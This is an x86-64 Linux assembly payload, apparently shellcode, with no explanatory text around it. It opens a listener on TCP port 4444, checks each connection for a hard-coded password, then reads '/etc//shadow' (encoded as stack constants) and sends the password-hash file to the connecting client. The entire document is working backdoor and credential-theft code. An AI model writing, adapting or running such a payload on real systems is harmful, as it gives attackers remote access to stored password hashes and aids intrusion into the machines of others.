global _start

section .text 

_start:
  ; SYS_SOCKET
  push 41
  pop rax       ; RAX = 41
  push 2
  pop rdi       ; RDI = 2
  push 1
  pop rsi       ; RSI = 1
  xor rdx, rdx  ; RDX = 0
  syscall

  ; SYS_BIND
  xchg rdi, rax
  push 2
  mov word [rsp + 2], 0x5C11  ; Port 4444
  push rsp
  pop rsi
  push 16
  pop rdx
  push 49
  pop rax
  syscall

  ; SYS_LISTEN
  xor rsi, rsi
  push 50
  pop rax
  syscall
  mov rbx, rdi

_awaitshell:
  ; SYS_ACCEPT
  mov rdi, rbx
  xor rsi, rsi  ; Client Socket Structure
  push 43   ; SYS_ACCEPT
  pop rax
  syscall   ; Execute

  ; SYS_RECVFROM
  xchg rdi, rax   ; Return FD From SYS_ACCEPT
  push 16         ; Size of sockaddr
  pop r9
  push rsp        ; sockaddr_in @ rsp
  pop r8
  xor r10, r10    ; flags
  lea rsi, [rsp - 8]  ; 8 bytes prior to sockaddr
  push 8
  pop rdx
  push 45
  pop rax    
  syscall 

  ; Check if Received Has Password
  lea rax, [rsp - 8]
  cmp dword [rax], 0x420a410a ; Reverse Order "\nA\nB"
  jne _wrong
  mov r12, rdi
  jmp short _exec
_wrong:
  ; Close Socket
  push 3
  pop rax
  syscall
  jmp short _awaitshell

  ; Execution Correct PW
_exec:
  ; SYS_OPEN
  xor rax, rax
  push rax
  push 0x776f6461
  mov rbx, 0x68732f2f6374652f
  push rbx
  push rsp
  pop rdi
  xor rsi, rsi
  mov rdx, rsi
  push 2
  pop rax
  syscall 

  mov rsi, rsp
  sub si, 0x1337  
  mov rdi, rax
  xor rax, rax
  mov dx, 0x1337
  syscall 
  
  mov rdi, r12
  mov rdx, rax
  push 1
  pop rax
  syscall
  
  ; Exit Cleanly
  xor rax, rax
  mov rdi, rax
  push 60
  pop rax
  syscall 
